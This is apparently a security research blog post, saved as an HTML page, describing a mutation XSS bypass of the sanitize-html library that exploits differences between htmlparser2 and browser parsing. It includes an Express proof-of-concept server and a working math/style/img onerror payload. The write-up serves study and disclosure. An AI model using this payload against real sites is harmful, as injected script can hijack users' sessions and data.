@@ -1,0 +1,142 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>HTML Sanitize Bypass Using MXSS · sanitize-html Bypass · xclow3n</title><meta name="description" content="Discovering how Mutation XSS (MXSS) can bypass the sanitize-html library due to differences between htmlparser2 and browser HTML parsers, allowing XSS attacks through style and math elements."><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=IM+Fell+English:ital@0;1&family=IM+Fell+English+SC&family=Pinyon+Script&family=Alegreya:ital,wght@0,400;0,500;1,400;1,500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"><link rel="stylesheet" href="/_astro/_slug_.DwJ29Fq7.css"></head> <body> <div class="paper"></div> <div class="paper2"></div> <div class="creases"></div> <div class="veil" id="veil"></div> <div class="band top" id="bandTop"><span></span></div> <div class="band bot" id="bandBot"><span></span></div> <header class="chrome"> <a class="brand" href="/">xclow3n<i>the grimoire map</i></a> <div class="r"> <a href="#top">to the top ↑</a> <a href="/">back to map</a> <a href="#" id="themeBtn">day edition</a> </div> </header> <nav class="rail" id="rail" aria-label="Waypoints"> <div class="cap">WAYPOINTS</div> <ol id="railList"> <li><a href="#top" class="active"><span class="n">✦</span><span>The threshold</span></a></li> <li><a href="#html-sanitize-bypass-using-mxss"><span class="n">I</span><span>HTML Sanitize Bypass Using MXSS</span></a></li><li><a href="#quick-introduction-to-mutation-xss"><span class="n">II</span><span>Quick Introduction to Mutation XSS</span></a></li><li><a href="#sanitize-html-bypass"><span class="n">III</span><span>sanitize-html Bypass</span></a></li> </ol> <div id="feet"> <svg width="14" height="16" viewBox="0 0 14 16" fill="currentColor" style="color:var(--ink)"> <ellipse cx="4" cy="5" rx="2.4" ry="3.4" opacity=".9"></ellipse><ellipse cx="4" cy="10.4" rx="1.1" ry="1.2" opacity=".9"></ellipse> <ellipse cx="10" cy="7" rx="2.4" ry="3.4" opacity=".55"></ellipse><ellipse cx="10" cy="12.4" rx="1.1" ry="1.2" opacity=".55"></ellipse> </svg> </div> </nav> <main class="wrap" id="top"> <div class="seal">RESEARCH · NOV 2024 · <a href="/">SANITIZE-HTML BYPASS</a></div> <h1 class="title">HTML Sanitize Bypass Using MXSS</h1> <div class="rule"><span class="ln"></span><span class="fl">✦</span><span class="ln"></span></div> <p class="lede">Discovering how Mutation XSS (MXSS) can bypass the sanitize-html library due to differences between htmlparser2 and browser HTML parsers, allowing XSS attacks through style and math elements.</p> <div class="tags"><span class="tag">Security Research</span><span class="tag">MXSS</span><span class="tag">XSS</span><span class="tag">HTML Sanitization</span><span class="tag">htmlparser2</span></div> <div class="thresh"></div> <article class="doc"> <h2 id="html-sanitize-bypass-using-mxss">HTML Sanitize Bypass Using MXSS</h2>
+<p>A couple of months ago, I was creating a CTF challenge but was missing a bug. To increase the difficulty of my challenge, I started looking for HTML sanitizer bypasses. During my research, I learned about Mutation XSS (MXSS), which can be used to bypass HTML sanitizers.</p>
+<h2 id="quick-introduction-to-mutation-xss">Quick Introduction to Mutation XSS</h2>
+<p>When broken markup is rendered, instead of crashing or displaying an error message, browsers attempt to interpret and fix the HTML as best as they can, even if it contains minor syntax errors or missing elements. For instance, opening the following markup in the browser:</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#444444">&#x3C;</span><span style="color:#4D9375">p</span><span style="color:#444444">></span><span style="color:#DBD7CACC">test</span></span></code></pre>
+<p>Will execute as expected despite missing a closing <code>&#x3C;/p></code> tag. When looking at the final page’s HTML code, we can see that the parser fixed our broken markup and closed the <code>&#x3C;p></code> element by itself:</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#444444">&#x3C;</span><span style="color:#4D9375">p</span><span style="color:#444444">></span><span style="color:#DBD7CACC">test</span><span style="color:#444444">&#x3C;/</span><span style="color:#4D9375">p</span><span style="color:#444444">></span></span></code></pre>
+<h2 id="sanitize-html-bypass">sanitize-html Bypass</h2>
+<p>While reading the documentation of the “sanitize-html” library, I noticed that it’s built on “htmlparser2,” which does not strictly comply with HTML specifications.</p>
+<p>Continuing with the testing after trying a bunch of payloads, I managed to create the following Proof of Concept (POC):</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#CB7676">const</span><span style="color:#BD976A"> express</span><span style="color:#444444"> =</span><span style="color:#80A665"> require</span><span style="color:#444444">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">express</span><span style="color:#C98A7D77">"</span><span style="color:#444444">);</span></span>
+<span class="line"><span style="color:#CB7676">const</span><span style="color:#BD976A"> bodyParser</span><span style="color:#444444"> =</span><span style="color:#80A665"> require</span><span style="color:#444444">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">body-parser</span><span style="color:#C98A7D77">"</span><span style="color:#444444">);</span></span>
+<span class="line"><span style="color:#CB7676">const</span><span style="color:#BD976A"> sanitizeHtml</span><span style="color:#444444"> =</span><span style="color:#80A665"> require</span><span style="color:#444444">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">sanitize-html</span><span style="color:#C98A7D77">"</span><span style="color:#444444">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">const</span><span style="color:#BD976A"> app</span><span style="color:#444444"> =</span><span style="color:#80A665"> express</span><span style="color:#444444">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD976A">app</span><span style="color:#444444">.</span><span style="color:#80A665">use</span><span style="color:#444444">(</span><span style="color:#BD976A">bodyParser</span><span style="color:#444444">.</span><span style="color:#80A665">urlencoded</span><span style="color:#444444">({</span><span style="color:#B8A965"> extended</span><span style="color:#444444">:</span><span style="color:#4D9375"> true</span><span style="color:#444444"> }));</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD976A">app</span><span style="color:#444444">.</span><span style="color:#80A665">get</span><span style="color:#444444">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span><span style="color:#444444"> (</span><span style="color:#BD976A">req</span><span style="color:#444444">,</span><span style="color:#BD976A"> res</span><span style="color:#444444">)</span><span style="color:#444444"> =></span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#CB7676">    const</span><span style="color:#BD976A"> userInput</span><span style="color:#444444"> =</span><span style="color:#C98A7D77"> `</span><span style="color:#C98A7D">&#x3C;math>&#x3C;style>&#x3C;img/src=x onerror="alert(1)"</span><span style="color:#C98A7D77">`</span><span style="color:#444444">;</span></span>
+<span class="line"><span style="color:#CB7676">    const</span><span style="color:#BD976A"> sanitizedInput</span><span style="color:#444444"> =</span><span style="color:#80A665"> sanitizeHtml</span><span style="color:#444444">(</span><span style="color:#BD976A">userInput</span><span style="color:#444444">,</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#B8A965">        allowedTags</span><span style="color:#444444">:</span><span style="color:#BD976A"> sanitizeHtml</span><span style="color:#444444">.</span><span style="color:#BD976A">defaults</span><span style="color:#444444">.</span><span style="color:#BD976A">allowedTags</span><span style="color:#444444">.</span><span style="color:#80A665">concat</span><span style="color:#444444">([</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">math</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">style</span><span style="color:#C98A7D77">"</span><span style="color:#444444">]),</span></span>
+<span class="line"><span style="color:#444444">    });</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#BD976A">    res</span><span style="color:#444444">.</span><span style="color:#80A665">send</span><span style="color:#444444">(</span><span style="color:#C98A7D77">`</span></span>
+<span class="line"><span style="color:#C98A7D">    &#x3C;!DOCTYPE html></span></span>
+<span class="line"><span style="color:#C98A7D">    &#x3C;html lang="en"></span></span>
+<span class="line"><span style="color:#C98A7D">        &#x3C;head></span></span>
+<span class="line"><span style="color:#C98A7D">            &#x3C;meta charset="UTF-8"></span></span>
+<span class="line"><span style="color:#C98A7D">            &#x3C;meta name="viewport" content="width=device-width, initial-scale=1.0"></span></span>
+<span class="line"><span style="color:#C98A7D">            &#x3C;title>Sanitized Output&#x3C;/title></span></span>
+<span class="line"><span style="color:#C98A7D">        &#x3C;/head></span></span>
+<span class="line"><span style="color:#C98A7D">        &#x3C;body></span></span>
+<span class="line"><span style="color:#C98A7D">            &#x3C;h1>Sanitized Output&#x3C;/h1></span></span>
+<span class="line"><span style="color:#C98A7D">            &#x3C;p></span><span style="color:#4D9375">${</span><span style="color:#C98A7D">sanitizedInput</span><span style="color:#4D9375">}</span><span style="color:#C98A7D">&#x3C;/p></span></span>
+<span class="line"><span style="color:#C98A7D">            &#x3C;a href="/">Back to form&#x3C;/a></span></span>
+<span class="line"><span style="color:#C98A7D">        &#x3C;/body></span></span>
+<span class="line"><span style="color:#C98A7D">    &#x3C;/html></span></span>
+<span class="line"><span style="color:#C98A7D77">    `</span><span style="color:#444444">);</span></span>
+<span class="line"><span style="color:#444444">});</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">const</span><span style="color:#BD976A"> PORT</span><span style="color:#444444"> =</span><span style="color:#BD976A"> process</span><span style="color:#444444">.</span><span style="color:#BD976A">env</span><span style="color:#444444">.</span><span style="color:#BD976A">PORT</span><span style="color:#CB7676"> ||</span><span style="color:#4C9A91"> 1337</span><span style="color:#444444">;</span></span>
+<span class="line"><span style="color:#BD976A">app</span><span style="color:#444444">.</span><span style="color:#80A665">listen</span><span style="color:#444444">(</span><span style="color:#BD976A">PORT</span><span style="color:#444444">,</span><span style="color:#444444"> ()</span><span style="color:#444444"> =></span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#BD976A">    console</span><span style="color:#444444">.</span><span style="color:#80A665">log</span><span style="color:#444444">(</span><span style="color:#C98A7D77">`</span><span style="color:#C98A7D">Server is running on http://localhost:</span><span style="color:#4D9375">${</span><span style="color:#C98A7D">PORT</span><span style="color:#4D9375">}</span><span style="color:#C98A7D77">`</span><span style="color:#444444">);</span></span>
+<span class="line"><span style="color:#444444">});</span></span></code></pre>
+<p>Technically, I think the maintainers of the library are aware of this issue because if you allow the <code>style</code> element in the allowed elements, you receive the following warning:</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#80A665">Server</span><span style="color:#C98A7D"> is</span><span style="color:#C98A7D"> running</span><span style="color:#C98A7D"> on</span><span style="color:#C98A7D"> http://localhost:1337</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#80A665">⚠️</span><span style="color:#C98A7D"> Your</span><span style="color:#444444"> `</span><span style="color:#80A665">allowedTags</span><span style="color:#444444">`</span><span style="color:#80A665"> option</span><span style="color:#C98A7D"> includes</span><span style="color:#444444"> `</span><span style="color:#80A665">style</span><span style="color:#444444">`</span><span style="color:#80A665">,</span></span>
+<span class="line"><span style="color:#B8A965">which</span><span style="color:#C98A7D"> is</span><span style="color:#C98A7D"> inherently</span><span style="color:#C98A7D"> vulnerable</span><span style="color:#C98A7D"> to</span><span style="color:#C98A7D"> XSS</span><span style="color:#C98A7D"> attacks.</span></span>
+<span class="line"><span style="color:#80A665">Please</span><span style="color:#C98A7D"> remove</span><span style="color:#C98A7D"> it</span><span style="color:#C98A7D"> from</span><span style="color:#444444"> `</span><span style="color:#80A665">allowedTags</span><span style="color:#444444">`</span><span style="color:#B8A965">.</span><span style="color:#C98A7D"> Or,</span><span style="color:#C98A7D"> to</span></span>
+<span class="line"><span style="color:#80A665">disable</span><span style="color:#C98A7D"> this</span><span style="color:#C98A7D"> warning,</span><span style="color:#C98A7D"> add</span><span style="color:#C98A7D"> the</span><span style="color:#444444"> `</span><span style="color:#80A665">allowVulnerableTags</span><span style="color:#444444">`</span></span>
+<span class="line"><span style="color:#80A665">option</span><span style="color:#C98A7D"> and</span><span style="color:#C98A7D"> ensure</span><span style="color:#C98A7D"> you</span><span style="color:#C98A7D"> are</span><span style="color:#C98A7D"> accounting</span><span style="color:#C98A7D"> for</span><span style="color:#C98A7D"> this</span><span style="color:#C98A7D"> risk.</span></span></code></pre>
+<p>The payload:</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#444444">&#x3C;</span><span style="color:#4D9375">math</span><span style="color:#444444">>&#x3C;</span><span style="color:#FDAEB7">style</span><span style="color:#444444">>&#x3C;</span><span style="color:#FDAEB7">img/src=x</span><span style="color:#BD976A"> onerror</span><span style="color:#444444">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">alert(1)</span><span style="color:#C98A7D77">"</span></span></code></pre>
+<p>This payload is not sanitized because htmlparser2 parses everything inside the <code>style</code> element as raw text. However, when the browser tries to fix the broken HTML, it does so according to HTML5 standards, resulting in the following rendering:</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#444444">&#x3C;</span><span style="color:#4D9375">math</span><span style="color:#444444">>&#x3C;/</span><span style="color:#4D9375">math</span><span style="color:#444444">></span></span>
+<span class="line"><span style="color:#444444">&#x3C;</span><span style="color:#4D9375">style</span><span style="color:#444444">>&#x3C;/</span><span style="color:#4D9375">style</span><span style="color:#444444">></span></span>
+<span class="line"><span style="color:#444444">&#x3C;</span><span style="color:#4D9375">img</span><span style="color:#BD976A"> src</span><span style="color:#444444">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">x</span><span style="color:#C98A7D77">"</span><span style="color:#BD976A"> onerror</span><span style="color:#444444">=</span><span style="color:#C98A7D77">"</span><span style="color:#80A665">alert</span><span style="color:#444444">(</span><span style="color:#4C9A91">1</span><span style="color:#444444">)</span><span style="color:#C98A7D77">"</span><span style="color:#444444">></span></span></code></pre>
+<p>Key points:</p>
+<ul>
+<li>
+<p>According to HTML standards, the <code>&#x3C;style></code> element cannot be inside the <code>&#x3C;math></code> element, so the <code>&#x3C;math></code> element is closed before encountering the <code>&#x3C;style></code> element.</p>
+</li>
+<li>
+<p>The <code>&#x3C;style></code> tag should only contain CSS, and the <code>&#x3C;math></code> tag should contain MathML elements. Placing an <code>&#x3C;img></code> tag inside a <code>&#x3C;style></code> tag violates these rules, so browsers automatically close the <code>&#x3C;style></code> tag before processing the <code>&#x3C;img></code> tag.</p>
+</li>
+<li>
+<p>That’s how this bypass works. In htmlparser2, it does not validate the content of the <code>&#x3C;style></code> element since it is treated as raw text.</p>
+</li>
+</ul>
+<p>The latest version as for now v2.13.1 still has this issue and I don’t think it will be patched unless the library replaces htmlparser2. This issue is showcased in the University CTF 2024 Intergalactic Bounty web challenge. Thanks a lot for reading!</p> </article> <div class="passages"> <div class="cap">SECRET PASSAGES · RELATED ENTRIES</div> <a href="/post/encodecept/"><b>EncoDecept</b> shared tag · xss</a><a href="/post/intergalactic-bounty/"><b>Intergalactic Bounty</b> shared tag · mxss</a><a href="/post/nodemailer-parser-discrepancy/"><b>Nodemailer Parser</b> shared tag · security research</a> </div> <div class="finis"> <span class="stamp"> <svg width="78" height="78" viewBox="0 0 78 78" fill="none"> <g style="color:var(--wax)"><circle cx="39" cy="39" r="34" stroke="currentColor" stroke-width="1.6" opacity=".85"></circle> <circle cx="39" cy="39" r="28" stroke="currentColor" stroke-width=".8" opacity=".6"></circle> <text x="39" y="36" text-anchor="middle" fill="currentColor" style="font-family:'IM Fell English SC';font-size:13px;letter-spacing:.2em">FINIS</text> <text x="39" y="52" text-anchor="middle" fill="currentColor" style="font-family:'IM Fell English',serif;font-style:italic;font-size:9px" opacity=".85">mischief managed</text></g> </svg> </span> </div> <nav class="nav"> <a class="prev" href="/post/breaking-pingora/"> <div class="d">← NEWER CORRIDOR</div> <div class="t">Breaking Pingora: HTTP Request Smuggling &amp; Cache Poisoning in Cloudflare&#39;s Reverse Proxy</div> <div class="w">breaking pingora · mar 2026</div> </a> <a class="next" href="/post/nodemailer-parser-discrepancy/"> <div class="d">OLDER CORRIDOR →</div> <div class="t">Email Parser Discrepancy in Nodemailer</div> <div class="w">nodemailer parser · nov 2024</div> </a> </nav> <div class="foot"><a href="/">MISCHIEF MANAGED — RETURN TO THE MAP</a></div> </main> <script>
+/* editions — shared with the map via localStorage; night is default */
+(function(){
+  let ed='night';
+  try{ ed=localStorage.getItem('archive-ed')||'night'; }catch(e){}
+  if(ed==='day') document.documentElement.classList.add('day');
+  const btn=document.getElementById('themeBtn');
+  const lbl=()=>{ btn.textContent=document.documentElement.classList.contains('day')?'night edition':'day edition'; };
+  lbl();
+  btn.addEventListener('click',ev=>{
+    ev.preventDefault();
+    const veil=document.getElementById('veil');
+    veil.classList.add('on');
+    setTimeout(()=>{
+      const day=document.documentElement.classList.toggle('day');
+      try{ localStorage.setItem('archive-ed',day?'day':'night'); }catch(e){}
+      lbl();
+      setTimeout(()=>veil.classList.remove('on'),140);
+    },400);
+  });
+})();
+
+/* latin bands, same phrase as the map */
+(function(){
+  const phrase='OMNIBVS ARCHIVANTIBVS BONVM AVDERE EST ARCHIVARE  ✦  ';
+  let s=''; while(s.length<400) s+=phrase;
+  document.querySelector('#bandTop span').textContent=s;
+  document.querySelector('#bandBot span').textContent=s;
+})();
+
+/* ink-soak reveal: monotonic, quick, no blinking */
+(function(){
+  if(matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+  const units=[...document.querySelectorAll('.seal,.title,.rule,.lede,.tags,.thresh,.doc > *,.passages,.finis,.nav,.foot')];
+  units.forEach((e,i)=>{
+    e.style.opacity='0';
+    const a=e.animate(
+      [{opacity:0,filter:'blur(2px)'},{opacity:1,filter:'blur(0px)'}],
+      {duration:1100,delay:120+Math.min(i*70,900)+Math.random()*180,
+       easing:'cubic-bezier(.33,.08,.35,1)',fill:'forwards'});
+    a.finished.then(()=>{a.cancel();e.style.opacity='';}).catch(()=>{});
+  });
+})();
+
+/* waypoints scrollspy + the reader's pacing feet */
+(function(){
+  const links=[...document.querySelectorAll('.rail a')];
+  if(!links.length) return;
+  const secs=links.map(a=>document.getElementById(a.getAttribute('href').slice(1)));
+  const feet=document.getElementById('feet');
+  function spy(){
+    const y=scrollY+150; let cur=0;
+    secs.forEach((s,i)=>{ if(s&&s.offsetTop<=y) cur=i; });
+    links.forEach((a,i)=>{
+      a.classList.toggle('active',i===cur);
+      a.classList.toggle('walked',i<cur);
+    });
+    /* feet walk the dotted line: interpolate within the current leg */
+    const rows=links.map(a=>a.parentElement);
+    const cA=rows[cur].offsetTop+6;
+    const cB=(rows[cur+1]?rows[cur+1].offsetTop:cA+26)+6;
+    const sTop=secs[cur]?secs[cur].offsetTop:0;
+    const sBot=secs[cur+1]?secs[cur+1].offsetTop:document.body.scrollHeight;
+    const k=Math.max(0,Math.min(1,(y-sTop)/Math.max(1,sBot-sTop)));
+    feet.style.top=(cA+(cB-cA)*k)+'px';
+  }
+  spy();
+  addEventListener('scroll',spy,{passive:true});
+  addEventListener('resize',spy);
+})();
+</script> </body> </html>
